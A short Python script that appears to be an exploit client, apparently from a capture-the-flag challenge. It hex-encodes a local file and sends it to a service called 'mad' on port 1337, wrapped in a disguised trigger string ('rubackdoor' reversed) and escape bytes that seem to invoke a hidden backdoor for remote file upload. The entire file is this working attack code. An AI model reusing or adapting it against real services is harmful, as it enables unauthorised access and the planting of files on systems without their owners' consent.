import socket
import sys

with open(sys.argv[1], "rb") as f:
    enhexed_content = f.read().hex()

command = f"scroll!!roodkcabur!\n\x1bfu{sys.argv[1]}\n{enhexed_content}\n\x1b\x1b".encode()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("mad", 1337))
sock.sendall(command)

for r in iter(lambda: sock.recv(512), b''):
    print(r.decode(errors="ignore"), end="")


sock.close()
